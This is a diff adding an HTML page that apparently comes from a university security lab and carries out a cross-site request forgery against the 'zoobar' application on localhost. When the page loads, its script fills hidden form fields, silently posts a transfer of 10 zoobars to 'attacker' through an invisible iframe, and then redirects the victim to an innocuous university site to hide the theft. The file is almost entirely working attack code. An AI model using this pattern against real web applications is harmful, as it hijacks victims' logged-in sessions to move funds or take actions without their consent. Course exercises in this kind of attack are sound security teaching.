@@ -1,0 +1,49 @@
+ <html>
+ <head>
+ 	<script>
+ 	var c =0;
+
+ 	function init()
+ 	{
+ 		var form = document.getElementById("loginform");
+ 		form.elements[0].value=10;
+ 		form.elements[1].value="attacker";
+ 		var iframe = document.getElementById("iframe");
+ 		iframe.addEventListener("load",transfer);
+ 		form.submit();
+ 	}
+  	function transfer()
+ 	{
+ 		document.location = "http://cse.iitk.ac.in/";
+ 	}
+
+	// function iframe_loaded()
+ // 	{
+ // 		var MyIFrame = document.getElementById("iframe");
+ // 		c = c+1;
+	// 	var MyIFrameDoc = (MyIFrame.contentWindow || MyIFrame.contentDocument);
+	// 	if (MyIFrameDoc.document) MyIFrameDoc = MyIFrameDoc.document;
+	// 	var form = MyIFrame.contentDocument.getElementsByName("transferform")[0];
+	// 	if(form!=null){
+	// 		form.elements[0].value="5";
+	// 		form.elements[1].value="rohit";
+	// 		MyIFrame.addEventListener("load",transfer);
+	// 		form.submit();
+	// 	}
+ // 	}
+
+ 	</script>
+
+ </head>
+ <body onload="init();">
+
+ <iframe  style="width:0px; height:0px; visibility: hidden;" name="hidden_frame" id="iframe">
+ </iframe>
+
+<form id="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer" target="hidden_frame" >
+	<input name="zoobars" type="text" value="" style="display:none">
+    <input name="recipient" type="text" value="" style="display:none">
+</form>	
+</p>
+</body>
+</html> 
